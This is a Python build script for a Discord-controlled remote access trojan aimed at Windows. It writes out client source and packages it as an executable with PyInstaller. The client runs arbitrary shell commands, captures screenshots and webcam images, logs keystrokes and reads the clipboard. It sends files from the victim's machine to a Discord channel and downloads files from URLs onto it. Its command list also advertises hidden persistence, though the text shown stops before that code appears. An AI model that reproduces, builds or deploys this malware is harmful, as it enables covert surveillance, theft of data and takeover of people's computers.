#!/usr/bin/env python3
"""
Discord C2 — Windows Auto Builder
Run this on a real Windows machine.
"""

import os
import sys
import subprocess
import urllib.request
import shutil
import time
from pathlib import Path

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN  = "YOUR_BOT_TOKEN"
CHANNEL_ID = "YOUR_CHANNEL_ID"
GUILD_ID   = "YOUR_GUILD_ID"
OUT_NAME   = "c2_client"
# ============================================================

BUILD_DIR  = Path(os.environ.get("TEMP", "C:\\Temp")) / "c2_build"
PYTHON_URL = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
PYTHON_DIR = Path("C:\\Python311")
PY_EXE     = PYTHON_DIR / "python.exe"


def enable_ansi():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(
            ctypes.windll.kernel32.GetStdHandle(-11), 7)

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; C = "\033[96m"; W = "\033[97m"; E = "\033[0m"

def info(msg): print(f"{B}[*]{E} {msg}")
def ok(msg):   print(f"{G}[+]{E} {msg}")
def warn(msg): print(f"{Y}[!]{E} {msg}")
def err(msg):  print(f"{R}[-]{E} {msg}"); sys.exit(1)
def step(msg): print(f"\n{W}══ {msg} ══{E}")
def ask(msg):
    print(f"{C}[?]{E} {msg}", end="")
    return input()


def banner():
    print(f"{W}")
    print("╔══════════════════════════════════════════════════════╗")
    print("║      Discord C2 — Windows EXE Builder               ║")
    print("╚══════════════════════════════════════════════════════╝")
    print(f"{E}")


def run(cmd, check=True, capture=False, shell=False):
    if isinstance(cmd, str):
        shell = True
    try:
        r = subprocess.run(cmd, shell=shell,
                           capture_output=capture, text=True)
        if check and r.returncode != 0 and capture:
            print(r.stdout); print(r.stderr)
        return r.returncode, \
               r.stdout if capture else "", \
               r.stderr if capture else ""
    except Exception as e:
        return 1, "", str(e)


def download(url, dest, desc=""):
    desc = desc or Path(dest).name
    info(f"Downloading {desc}...")
    def progress(count, block, total):
        if total <= 0: return
        pct  = min(int(count * block * 50 / total), 50)
        done = round(count * block / 1048576, 1)
        tot  = round(total / 1048576, 1)
        bar  = "█" * pct + "░" * (50 - pct)
        print(f"\r  [{bar}] {done}/{tot} MB", end="", flush=True)
    try:
        urllib.request.urlretrieve(url, dest, progress)
        print("")
        ok(f"Downloaded: {dest}")
        return True
    except Exception as e:
        print(""); warn(f"Download failed: {e}"); return False


def collect_config():
    global BOT_TOKEN, CHANNEL_ID, GUILD_ID, OUT_NAME
    step("Configuration")
    v = ask(f"EXE name [{OUT_NAME}]: ").strip()
    if v: OUT_NAME = v
    v = ask("Bot Token [Enter=keep]: ").strip()
    if v: BOT_TOKEN = v
    v = ask("Channel ID [Enter=keep]: ").strip()
    if v: CHANNEL_ID = v
    v = ask("Guild ID [Enter=keep]: ").strip()
    if v: GUILD_ID = v
    print(f"\n  EXE     : {OUT_NAME}.exe")
    print(f"  Token   : {BOT_TOKEN[:20]}...")
    print(f"  Channel : {CHANNEL_ID}")
    v = ask("\nContinue? [Y/n]: ").strip().lower()
    if v == "n": sys.exit(0)


def ensure_python():
    step("Python 3.11")
    if PY_EXE.exists():
        rc, out, _ = run([str(PY_EXE), "--version"],
                         capture=True, check=False)
        if rc == 0:
            ok(f"Python found: {out.strip()}"); return
    rc, out, _ = run("python --version", capture=True,
                     check=False, shell=True)
    if rc == 0 and "3." in out:
        ok(f"Python on PATH: {out.strip()}"); return
    warn("Downloading Python 3.11...")
    inst = BUILD_DIR / "python-installer.exe"
    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    if not download(PYTHON_URL, str(inst), "Python 3.11.9"):
        err("Failed to download Python")
    run([str(inst), "/quiet", "InstallAllUsers=0",
         "PrependPath=1", "Include_pip=1",
         f"TargetDir={PYTHON_DIR}"], check=False)
    time.sleep(3)
    if not PY_EXE.exists():
        err("Python install failed")
    ok(f"Python installed: {PYTHON_DIR}")


def get_python():
    candidates = [PY_EXE,
                  Path("C:\\Python311\\python.exe"),
                  Path("C:\\Python310\\python.exe")]
    rc, out, _ = run("where python", capture=True,
                     check=False, shell=True)
    if rc == 0:
        for line in out.strip().splitlines():
            p = Path(line.strip())
            if p.exists():
                candidates.insert(0, p)
    for c in candidates:
        if c.exists():
            rc, out, _ = run([str(c), "--version"],
                             capture=True, check=False)
            if rc == 0:
                return c
    err("No working Python found")


def install_packages(py: Path):
    step("Installing Packages")
    pkgs = ["requests", "websocket-client",
            "pyinstaller", "opencv-python-headless"]
    for pkg in pkgs:
        info(f"  pip install {pkg}...")
        run([str(py), "-m", "pip", "install", pkg,
             "-q", "--no-warn-script-location"],
            capture=True, check=False)
        rc2, out2, _ = run(
            [str(py), "-m", "pip", "show", pkg],
            capture=True, check=False)
        if rc2 == 0:
            name = [l for l in out2.splitlines()
                    if l.startswith("Name:")]
            ok(f"  {name[0] if name else pkg}")
        else:
            if pkg == "opencv-python-headless":
                warn(f"  {pkg} skipped (optional)")
            else:
                err(f"  {pkg} failed")
    rc, out, _ = run([str(py), "-m", "PyInstaller", "--version"],
                     capture=True, check=False)
    if rc == 0:
        ok(f"PyInstaller: {out.strip()}")
    else:
        err("PyInstaller not working")


def write_source() -> Path:
    step("Writing C2 Source")
    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    src = BUILD_DIR / "c2_client.py"

    header = (
        "# Discord C2 Client -- Auto-generated\n"
        "import os, sys, time, socket, platform, subprocess\n"
        "import threading, json, requests, random, string\n"
        "from datetime import datetime\n"
        "\n"
        f'BOT_TOKEN   = "{BOT_TOKEN}"\n'
        f'CHANNEL_ID  = "{CHANNEL_ID}"\n'
        f'GUILD_ID    = "{GUILD_ID}"\n'
        "MAX_MSG_LEN = 1900\n"
        'API_BASE    = "https://discord.com/api/v10"\n'
    )

    body = r'''

def _ensure(pkg, imp=None):
    try:
        __import__(imp or pkg)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", pkg, "-q"],
            capture_output=True
        )

_ensure("requests")
_ensure("websocket-client", "websocket")
import websocket


class DiscordAPI:
    def __init__(self, token):
        self.token = token
        self.s = requests.Session()
        self.s.headers.update({
            "Authorization": f"Bot {token}",
            "Content-Type":  "application/json",
            "User-Agent":    "DiscordBot (c2,2.0)"
        })

    def send(self, ch, content=None, embeds=None,
             components=None, files=None):
        url = f"{API_BASE}/channels/{ch}/messages"
        if files:
            import json as _j
            p = {}
            if content:    p["content"]    = content
            if embeds:     p["embeds"]     = embeds
            if components: p["components"] = components
            h = {k: v for k, v in self.s.headers.items()
                 if k != "Content-Type"}
            r = requests.post(url, headers=h,
                              data={"payload_json": _j.dumps(p)},
                              files=files, timeout=20)
        else:
            p = {}
            if content:    p["content"]    = content
            if embeds:     p["embeds"]     = embeds
            if components: p["components"] = components
            r = self.s.post(url, json=p, timeout=10)
        if r.status_code not in (200, 201):
            print(f"[!] {r.status_code}: {r.text[:80]}")
            return {}
        return r.json()

    def ack(self, iid, tok, content=None,
            embeds=None, components=None, modal=None):
        url = f"{API_BASE}/interactions/{iid}/{tok}/callback"
        if modal:
            requests.post(url,
                          json={"type": 9, "data": modal},
                          headers={"Content-Type": "application/json"},
                          timeout=10)
            return
        d = {}
        if content:    d["content"]    = content
        if embeds:     d["embeds"]     = embeds
        if components: d["components"] = components
        requests.post(url,
                      json={"type": 4, "data": d},
                      headers={"Content-Type": "application/json"},
                      timeout=10)

    def edit(self, ch, mid, content=None,
             embeds=None, components=None):
        url = f"{API_BASE}/channels/{ch}/messages/{mid}"
        p = {}
        if content    is not None: p["content"]    = content
        if embeds     is not None: p["embeds"]     = embeds
        if components is not None: p["components"] = components
        r = self.s.patch(url, json=p, timeout=10)
        return r.json() if r.ok else {}

    def register_slash(self, guild_id):
        url = f"{API_BASE}/applications/@me"
        r = self.s.get(url, timeout=10)
        if not r.ok:
            print(f"[!] Could not get app id: {r.text[:80]}")
            return
        app_id = r.json().get("id")
        if not app_id:
            return

        cmds = [
            {"name": "ls",
             "description": "List active sessions", "type": 1},
            {"name": "interact",
             "description": "Start interactive shell",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "exit",
             "description": "Leave interactive mode", "type": 1},
            {"name": "cmd",
             "description": "Run a shell command",
             "type": 1,
             "options": [
                 {"name": "command", "description": "Command to run",
                  "type": 3, "required": True},
                 {"name": "id", "description": "Session ID (optional in interactive)",
                  "type": 3, "required": False}
             ]},
            {"name": "shell",
             "description": "Open popup text box for a command",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "sysinfo",
             "description": "Get system information",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "screenshot",
             "description": "Take a screenshot",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "webshot",
             "description": "Capture webcam image",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "processes",
             "description": "List running processes",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "netstat",
             "description": "Show network connections",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "arp",
             "description": "Show ARP table",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "download",
             "description": "Download a file from target",
             "type": 1,
             "options": [
                 {"name": "path", "description": "Remote file path",
                  "type": 3, "required": True},
                 {"name": "id", "description": "Session ID",
                  "type": 3, "required": False}
             ]},
            {"name": "upload",
             "description": "Upload a file to target",
             "type": 1,
             "options": [
                 {"name": "url", "description": "URL of file",
                  "type": 3, "required": True},
                 {"name": "dest", "description": "Destination path",
                  "type": 3, "required": True},
                 {"name": "id", "description": "Session ID",
                  "type": 3, "required": False}
             ]},
            {"name": "clipboard_get",
             "description": "Get clipboard contents",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "clipboard_set",
             "description": "Set clipboard contents",
             "type": 1,
             "options": [
                 {"name": "text", "description": "Text to set",
                  "type": 3, "required": True},
                 {"name": "id", "description": "Session ID",
                  "type": 3, "required": False}
             ]},
            {"name": "keyscan_start",
             "description": "Start keylogger",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "keyscan_dump",
             "description": "Dump keylogger buffer",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "keyscan_stop",
             "description": "Stop keylogger",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "persist_reg",
             "description": "Persist via registry (hidden)",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "persist_task",
             "description": "Persist via scheduled task (hidden)",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "persist_startup",
             "description": "Persist via startup folder (hidden)",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "persist_all",
             "description": "Install all persistence methods (hidden)",
             "type": 1,
             "options": [{"name": "id", "description": "Session ID",
                          "type": 3, "required": False}]},
            {"name": "help",
             "description": "Show all commands", "type": 1},
        ]

        url2 = f"{API_BASE}/applications/{app_id}/guilds/{guild_id}/commands"
        for cmd in cmds:
            r2 = self.s.post(url2, json=cmd, timeout=10)
            if r2.status_code in (200, 201):
                print(f"  [/] registered /{cmd['name']}")
            else:
                print(f"  [!] /{cmd['name']}: {r2.text[:60]}")


class Gateway:
    URL = "wss://gateway.discord.gg/?v=10&encoding=json"

    def __init__(self, token, cb):
        self.token = token; self.cb = cb
        self.ws    = None;  self.hbi = 41250
        self.seq   = None;  self.run = False
        self._stat = "online"; self._act = "C2"
        self._hbt  = None

    def start(self):
        self.run = True
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.run = False
        if self.ws:
            try:    self.ws.close()
            except: pass

    def presence(self, status, act):
        self._stat = status; self._act = act
        self._pres()

    def _loop(self):
        while self.run:
            try:
                self.ws = websocket.WebSocketApp(
                    self.URL,
                    on_open    = lambda ws: None,
                    on_message = self._msg,
                    on_error   = lambda ws, e: None,
                    on_close   = lambda ws, c, m: None,
                )
                self.ws.run_forever(ping_interval=0)
            except:
                pass
            if self.run: time.sleep(5)

    def _msg(self, ws, raw):
        try:
            p  = json.loads(raw)
            op = p.get("op"); d = p.get("d")
            t  = p.get("t");  s = p.get("s")
            if s: self.seq = s
            if op == 10:
                self.hbi = d["heartbeat_interval"]
                self._id()
                if not self._hbt or not self._hbt.is_alive():
                    self._hbt = threading.Thread(
                        target=self._hb, daemon=True)
                    self._hbt.start()
            elif op == 1:
                self._send({"op": 1, "d": self.seq})
            elif op == 7:
                ws.close()
            elif op == 0:
                if t == "READY":
                    print(f"[GW] {d.get('user', {}).get('username')}")
                    self._pres()
                self.cb(t, d)
        except:
            pass

    def _id(self):
        self._send({"op": 2, "d": {
            "token":   self.token,
            "intents": 33281,
            "properties": {
                "os":      "windows",
                "browser": "disco",
                "device":  "disco"
            },
            "presence": self._pd()
        }})

    def _pres(self):
        self._send({"op": 3, "d": self._pd()})

    def _pd(self):
        return {
            "since":      None,
            "activities": [{"name": self._act, "type": 0}],
            "status":     self._stat,
            "afk":        False
        }

    def _hb(self):
        while self.run:
            self._send({"op": 1, "d": self.seq})
            time.sleep(self.hbi / 1000)

    def _send(self, p):
        if self.ws:
            try:    self.ws.send(json.dumps(p))
            except: pass


def btn(label, cid, style=2):
    return {"type": 2, "style": style,
            "label": label, "custom_id": cid}


def sbtn(sid, inter=False):
    rows = [{"type": 1, "components": [
        btn("Interact",   f"interact|{sid}",   1),
        btn("Shell",      f"shell|{sid}",      2),
        btn("Screenshot", f"screenshot|{sid}", 2),
        btn("Processes",  f"processes|{sid}",  2),
        btn("WebShot",    f"webshot|{sid}",    2),
    ]}, {"type": 1, "components": [
        btn("Persist",    f"persist|{sid}",    4),
        btn("SysInfo",    f"sysinfo|{sid}",    2),
        btn("Clipboard",  f"clipboard|{sid}",  2),
        btn("KeyScan",    f"keyscan|{sid}",    2),
        btn("Terminate",  f"terminate|{sid}",  4) if inter
            else btn("Exit", f"noop|{sid}", 2),
    ]}]
    return rows


def semb(sid, hn, user, osn, arch, ip, cwd, inter=False):
    return {
        "title":  f"Session {sid}",
        "color":  0xFEE75C if inter else 0x57F287,
        "fields": [
            {"name": "Host", "value": f"`{hn}`",         "inline": True},
            {"name": "User", "value": f"`{user}`",        "inline": True},
            {"name": "OS",   "value": f"`{osn} {arch}`",  "inline": True},
            {"name": "IP",   "value": f"`{ip}`",          "inline": True},
            {"name": "CWD",  "value": f"`{cwd}`",         "inline": True},
            {"name": "Mode", "value": "🔴 INTERACTIVE" if inter
                             else "🟢 Passive",           "inline": True},
        ],
        "footer":    {"text": "C2 Discord"},
        "timestamp": datetime.utcnow().isoformat()
    }


def hemb():
    return {
        "title": "C2 Slash Commands", "color": 0x5865F2,
        "description": (
            "All commands use `/` prefix.\n"
            "In **interactive** mode the `id` field is always optional."
        ),
        "fields": [
            {"name": "📋 Sessions",
             "value": "`/ls`  `/interact [id]`  `/exit`",
             "inline": False},
            {"name": "💻 Shell",
             "value": "`/cmd <command> [id]`  `/shell [id]`",
             "inline": False},
            {"name": "🔍 Recon",
             "value": ("`/sysinfo`  `/screenshot`  `/webshot`  "
                       "`/processes`  `/netstat`  `/arp`"),
             "inline": False},
            {"name": "📁 Files",
             "value": "`/download <path>`  `/upload <url> <dest>`",
             "inline": False},
            {"name": "📎 Clipboard",
             "value": "`/clipboard_get`  `/clipboard_set <text>`",
             "inline": False},
            {"name": "⌨️ Keylogger",
             "value": "`/keyscan_start`  `/keyscan_dump`  `/keyscan_stop`",
             "inline": False},
            {"name": "🔒 Persistence",
             "value": ("`/persist_reg`  `/persist_task`  "
                       "`/persist_startup`  `/persist_all`\n"
                       "All run **silently in background** via VBS launcher."),
             "inline": False},
            {"name": "💡 Tips",
             "value": ("• In interactive mode `[id]` is never needed.\n"
                       "• `/shell` opens a popup text box.\n"
                       "• Persistence uses `.vbs` — no CMD window appears."),
             "inline": False},
        ],
        "footer":    {"text": "C2 Discord"},
        "timestamp": datetime.utcnow().isoformat()
    }


def modal_shell(sid):
    return {
        "title":      f"Shell — {sid}",
        "custom_id":  f"modal_shell|{sid}",
        "components": [{"type": 1, "components": [{
            "type":        4,
            "custom_id":   "cmd_input",
            "label":       "Command",
            "style":       2,
            "min_length":  1,
            "max_length":  1000,
            "placeholder": "Type your command here...",
            "required":    True
        }]}]
    }


class C2:
    def __init__(self):
        self.hn    = platform.node()
        self.osn   = platform.system()
        self.osv   = platform.version()
        self.arch  = platform.machine()
        self.cwd   = os.getcwd()
        self.alive = True
        try:    self.user = os.getlogin()
        except: self.user = (
            os.environ.get("USERNAME") or
            os.environ.get("USER", "?"))
        try:    self.ip = socket.gethostbyname(socket.gethostname())
        except: self.ip = "unknown"
        tag = "".join(random.choices(
            string.ascii_uppercase + string.digits, k=6))
        self.sid   = f"{self.hn[:8].upper()}-{tag}"
        self.inter = False
        self.ich   = CHANNEL_ID
        self.kla   = False
        self.klb   = []
        self.api   = DiscordAPI(BOT_TOKEN)
        self.gw    = Gateway(BOT_TOKEN, self._ev)

    def _mine(self, sid_opt):
        if not sid_opt:
            return self.inter
        s = sid_opt.strip()
        return s.lower() == "all" or s == self.sid

    def _ev(self, t, d):
        if not d: return
        try:
            if   t == "MESSAGE_CREATE":     self._msg(d)
            elif t == "INTERACTION_CREATE": self._interaction(d)
        except Exception as e:
            print(f"[!] {t}: {e}")

    def _interaction(self, d):
        itype = d.get("type")
        if   itype == 2: self._slash(d)
        elif itype == 3: self._ibtn(d)
        elif itype == 5: self._imodal(d)

    def _slash(self, d):
        iid  = d.get("id");   tok = d.get("token")
        ch   = d.get("channel_id", CHANNEL_ID)
        name = d.get("data", {}).get("name", "")
        opts = {o["name"]: o.get("value")
                for o in d.get("data", {}).get("options", [])}
        sid_opt = opts.get("id")

        if name == "help":
            self.api.ack(iid, tok, embeds=[hemb()]); return
        if name == "ls":
            self.api.ack(iid, tok,
                embeds=[semb(self.sid, self.hn, self.user,
                             self.osn, self.arch, self.ip,
                             self.cwd, self.inter)],
                components=sbtn(self.sid, self.inter)); return
        if name == "exit":
            if self.inter:
                self._stop(ch)
                self.api.ack(iid, tok, content="Left interactive mode.")
            else:
                self.api.ack(iid, tok, content="Not in interactive mode.")
            return
        if name == "interact":
            sid_val = opts.get("id", self.sid)
            if not sid_val or sid_val == self.sid:
                self.api.ack(iid, tok, content="Starting shell…")
                self._start(ch)
            else:
                self.api.ack(iid, tok,
                    content=f"Session `{sid_val}` is not this implant.")
            return
        if name == "shell":
            if not self._mine(sid_opt):
                self.api.ack(iid, tok,
                    content="Not targeting this session."); return
            self.api.ack(iid, tok, modal=modal_shell(self.sid)); return

        if not self._mine(sid_opt):
            return

        self.api.ack(iid, tok, content="⏳ Working…")

        if name == "cmd":
            cmd = opts.get("command", "")
            threading.Thread(
                target=lambda: self._chunk(self._sh(cmd), ch),
                daemon=True).start()
        elif name == "sysinfo":
            self._chunk(self._sysinfo(), ch)
        elif name == "screenshot":
            threading.Thread(
                target=lambda: self._ss(ch), daemon=True).start()
        elif name == "webshot":
            threading.Thread(
                target=lambda: self._ws_shot(ch), daemon=True).start()
        elif name == "processes":
            threading.Thread(
                target=lambda: self._chunk(self._processes(), ch),
                daemon=True).start()
        elif name == "netstat":
            threading.Thread(
                target=lambda: self._chunk(self._netstat(), ch),
                daemon=True).start()
        elif name == "arp":
            threading.Thread(
                target=lambda: self._chunk(self._arp(), ch),
                daemon=True).start()
        elif name == "download":
            threading.Thread(
                target=lambda: self._dl(opts.get("path", ""), ch),
                daemon=True).start()
        elif name == "upload":
            threading.Thread(
                target=lambda: self._chunk(
                    self._ul(opts.get("url", ""),
                             opts.get("dest", "")), ch),
                daemon=True).start()
        elif name == "clipboard_get":
            self._chunk(self._cget(), ch)
        elif name == "clipboard_set":
            self._chunk(self._cset(opts.get("text", "")), ch)
        elif name == "keyscan_start":
            self._chunk(self._kls(), ch)
        elif name == "keyscan_dump":
            self._chunk(self._kld(), ch)
        elif name == "keyscan_stop":
            self._chunk(self._klx(), ch)
        elif name == "persist_reg":
            threading.Thread(
                target=lambda: self._chunk(self._preg(), ch),
                daemon=True).start()
        elif name == "persist_task":
            threading.Thread(
                target=lambda: self._chunk(self._ptask(), ch),
                daemon=True).start()
        elif name == "persist_startup":
            threading.Thread(
                target=lambda: self._chunk(self._pstart(), ch),
                daemon=True).start()
        elif name == "persist_all":
            threading.Thread(
                target=lambda: self._chunk(self._pall(), ch),
                daemon=True).start()

    def _imodal(self, d):
        iid = d.get("id"); tok = d.get("token")
        ch  = d.get("channel_id", CHANNEL_ID)
        cid = d.get("data", {}).get("custom_id", "")
        if not cid.startswith("modal_shell|"): return
        sid = cid.split("|", 1)[1]
        if sid != self.sid: return
        cmd = ""
        for row in d.get("data", {}).get("components", []):
            for comp in row.get("components", []):
                if comp.get("custom_id") == "cmd_input":
                    cmd = comp.get("value", "").strip()
        if not cmd:
            self.api.ack(iid, tok, content="Empty command."); return
        self.api.ack(iid, tok, content=f"▶ `{cmd}`")
        threading.Thread(
            target=lambda: self._chunk(self._sh(cmd), ch),
            daemon=True).start()

    def _ibtn(self, d):
        iid = d.get("id");   tok = d.get("token")
        ch  = d.get("channel_id", CHANNEL_ID)
        cid = d.get("data", {}).get("custom_id", "")
        if "|" not in cid: return
        act, sid = cid.split("|", 1)
        if sid != self.sid: return

        if act == "noop":
            self.api.ack(iid, tok, content="Not in interactive mode."); return
        elif act == "interact":
            self.api.ack(iid, tok, content="Starting shell…")
            self._start(ch)
        elif act == "shell":
            self.api.ack(iid, tok, modal=modal_shell(self.sid))
        elif act == "webshot":
            self.api.ack(iid, tok, content="📷 Capturing webcam…")
            threading.Thread(
                target=lambda: self._ws_shot(ch), daemon=True).start()
        elif act == "processes":
            self.api.ack(iid, tok, content="⏳ Fetching…")
            threading.Thread(
                target=lambda: self._chunk(self._processes(), ch),
                daemon=True).start()
        elif act == "screenshot":
            self.api.ack(iid, tok, content="📸 Capturing…")
            threading.Thread(
                target=lambda: self._ss(ch), daemon=True).start()
        elif act == "sysinfo":
            self.api.ack(iid, tok, content="⏳ Fetching…")
            self._chunk(self._sysinfo(), ch)
        elif act == "clipboard":
            self.api.ack(iid, tok, content="📋 Reading…")
            self._chunk(self._cget(), ch)
        elif act == "keyscan":
            if not self.kla:
                self.api.ack(iid, tok, content="⌨️ Keylogger started.")
                self._kls()
            else:
                self.api.ack(iid, tok, content="⌨️ Dumping keys…")
                self._chunk(self._kld(), ch)
        elif act == "persist":
            self.api.ack(iid, tok,
                content="🔒 Installing hidden persistence…")
            threading.Thread(
                target=lambda: self._chunk(self._pall(), ch),
                daemon=True).start()
        elif act == "terminate":
            self.api.ack(iid, tok,
                content=f"❌ Terminating {sid}")
            self._stop(ch)

    def _msg(self, d):
        if d.get("channel_id") != CHANNEL_ID: return
        if d.get("author", {}).get("bot"):     return
        raw = d.get("content", "").strip()
        if not raw: return
        if self.inter and not raw.startswith("/"):
            ch = d.get("channel_id", CHANNEL_ID)
            threading.Thread(
                target=lambda: self._chunk(self._sh(raw), ch),
                daemon=True).start()

    def _start(self, ch):
        self.inter = True; self.ich = ch
        self.gw.presence("dnd", f"Interactive {self.sid}")
        self.api.send(ch, embeds=[{
            "title":       f"🔴 Shell — {self.sid}",
            "description": (
                "Interactive shell started.\n"
                "Type commands directly **or** use `/cmd`.\n"
                "Use `/shell` for a popup text box.\n"
                "Use `/exit` to leave."
            ),
            "color":       0xFEE75C,
            "footer":      {"text": self.sid},
            "timestamp":   datetime.utcnow().isoformat()
        }])

    def _stop(self, ch):
        self.inter = False; self.ich = CHANNEL_ID
        self.gw.presence("online", f"Idle {self.sid}")
        self.api.send(ch, embeds=[{
            "title":       "🟢 Interactive Ended",
            "description": f"{self.sid} is now passive.",
            "color":       0x57F287,
            "footer":      {"text": self.sid},
            "timestamp":   datetime.utcnow().isoformat()
        }])

    def _chunk(self, txt, ch):
        if not txt or not txt.strip(): return
        sz = MAX_MSG_LEN - 8
        for c in [txt[i:i+sz] for i in range(0, len(txt), sz)]:
            self.api.send(ch, content=f"```\n{c}\n```")
            time.sleep(0.3)

    def _sysinfo(self):
        return (
            f"Session : {self.sid}\n"
            f"Host    : {self.hn}\n"
            f"OS      : {self.osn} {self.osv}\n"
            f"Arch    : {self.arch}\n"
            f"User    : {self.user}\n"
            f"IP      : {self.ip}\n"
            f"CWD     : {self.cwd}\n"
            f"PID     : {os.getpid()}"
        )

    def _sh(self, cmd):
        try:
            p = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.cwd, text=True)
            o, e = p.communicate(timeout=30)
            return (o + e).strip() or "[*] No output"
        except subprocess.TimeoutExpired:
            p.kill(); return "[-] Timeout"
        except Exception as e: return f"[-] {e}"

    def _processes(self):
        try:
            r = subprocess.run(
                ["tasklist", "/fo", "csv", "/nh"],
                capture_output=True, text=True, timeout=15)
            lines = r.stdout.strip().split("\n")[:50]
            out = f"{'Name':<25}{'PID':<8}Mem\n" + "-"*40 + "\n"
            for l in lines:
                p = l.replace('"', '').split(",")
                if len(p) >= 5:
                    out += f"{p[0][:24]:<25}{p[1]:<8}{p[4].strip()}\n"
            return out
        except Exception as e: return f"[-] {e}"

    def _netstat(self):
        try:
            r = subprocess.run(["netstat", "-ano"],
                capture_output=True, text=True, timeout=15)
            return r.stdout[:MAX_MSG_LEN * 2] or "empty"
        except Exception as e: return f"[-] {e}"

    def _arp(self):
        try:
            r = subprocess.run(["arp", "-a"],
                capture_output=True, text=True, timeout=10)
            return r.stdout.strip() or "empty"
        except Exception as e: return f"[-] {e}"

    def _dl(self, fp, ch):
        try:
            fp = fp.strip()
            if not os.path.isfile(fp):
                self.api.send(ch, content=f"Not found: `{fp}`"); return
            with open(fp, "rb") as f: data = f.read()
            fn = os.path.basename(fp)
            self.api.send(ch,
                content=f"📁 `{fn}` ({len(data):,} bytes)",
                files={"file": (fn, data)})
        except Exception as e:
            self.api.send(ch, content=f"Download error: {e}")

    def _ul(self, url, dest):
        try:
            if not url or not dest:
                return "Usage: /upload url=<url> dest=<path>"
            r = requests.get(url.strip(), timeout=30)
            r.raise_for_status()
            with open(dest.strip(), "wb") as f: f.write(r.content)
            return f"[+] {len(r.content):,}b → {dest}"
        except Exception as e: return f"[-] {e}"

    def _ss(self, ch):
        tmp = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "sc.png")
        try:
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
                "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                "$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;"
                "$g=[System.Drawing.Graphics]::FromImage($b);"
                "$g.CopyFromScreen($s.Left,$s.Top,0,0,$s.Size);"
                "$b.Save('" + tmp + "');"
                "$g.Dispose();$b.Dispose()"
            )
            subprocess.run(
                ["powershell", "-WindowStyle", "Hidden",
                 "-Command", ps], timeout=15)
            if os.path.isfile(tmp):
                with open(tmp, "rb") as f: data = f.read()
                try: os.remove(tmp)
                except: pass
                self.api.send(ch, content="📸 Screenshot",
                    files={"file": ("screenshot.png", data)})
            else:
                self.api.send(ch, content="Screenshot failed.")
        except Exception as e:
            self.api.send(ch, content=f"Screenshot error: {e}")

    def _ws_shot(self, ch):
        tmp = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "wc.jpg")
        try:
            try:
                import cv2
                cap = cv2.VideoCapture(0)
                if not cap.isOpened(): raise RuntimeError("no cam")
                time.sleep(0.5)
                ret, frame = cap.read(); cap.release()
                if not ret: raise RuntimeError("no frame")
                cv2.imwrite(tmp, frame)
            except ImportError:
                r = subprocess.run(
                    ["ffmpeg", "-f", "dshow", "-i", "video=",
                     "-frames:v", "1", "-q:v", "2", tmp, "-y"],
                    capture_output=True, timeout=10)
                if r.returncode != 0:
                    raise RuntimeError("ffmpeg not available")
            if os.path.isfile(tmp):
                with open(tmp, "rb") as f: data = f.read()
                try: os.remove(tmp)
                except: pass
                ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
                fn = f"webcam_{self.sid}_{ts}.jpg"
                self.api.send(ch, content="📷 Webcam",
                    files={"file": (fn, data)})
            else:
                self.api.send(ch, content="Webcam: file missing")
        except Exception as e:
            self.api.send(ch, content=f"Webcam error: {e}")

    def _cget(self):
        try:
            r = subprocess.run(
                ["powershell", "-Command", "Get-Clipboard"],
                capture_output=True, text=True)
            return r.stdout.strip() or "Clipboard empty."
        except Exception as e: return f"[-] {e}"

    def _cset(self, txt):
        try:
            subprocess.run(["powershell", "-Command",
                f'Set-Clipboard "{txt}"'])
            return "[+] Clipboard set."
        except Exception as e: return f"[-] {e}"

    def _kls(self):
        if self.kla: return "[*] Keylogger already running."
        self.kla = True; self.klb = []
        def lp():
            try:
                import ctypes
                while self.kla:
                    for v in range(0x20, 0x7F):
                        if ctypes.windll.user32.GetAsyncKeyState(v) & 0x8000:
                            self.klb.append(chr(v))
                    time.sleep(0.05)
            except: pass
        threading.Thread(target=lp, daemon=True).start()
        return "[+] Keylogger started."

    def _kld(self):
        if not self.klb: return "[*] Key buffer empty."
        d = "".join(self.klb[-1000:]); self.klb.clear()
        return f"Keys captured:\n{d}"

    def _klx(self):
        self.kla = False; return "[*] Keylogger stopped."

    # ══════════════════════════════════════════════════════
